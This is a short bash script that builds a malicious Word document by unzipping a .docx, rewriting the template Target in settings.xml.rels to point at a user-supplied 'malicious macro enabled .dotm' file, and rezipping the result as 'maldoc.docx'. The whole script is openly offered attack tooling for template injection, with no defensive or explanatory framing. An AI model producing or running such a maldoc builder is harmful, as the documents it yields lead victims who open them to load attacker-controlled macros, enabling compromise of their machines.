#!/usr/bin/env bash
read -p "Enter full path to .docx: " docx

#unzip docx to working dir  
workdir="/tmp/working"
unzip "$docx" -d "$workdir" > /dev/null
cd /tmp/working/word/_rels

#replace template target with malicious macro enabled .dotm file
read -p "Enter full path to Malicious .dotm (surround by \"\"): " dotm
sed -i -r "s#Target="\(.*?\)" #Target=$dotm #" settings.xml.rels > /dev/null

#rezip, delete working dir and replace original docx
cd /tmp/working/
read -p "Enter directory to put the \"maldoc.docx\": " maldocdir
zip -r maldoc.docx . > /dev/null
cp /tmp/working/maldoc.docx "$maldocdir"


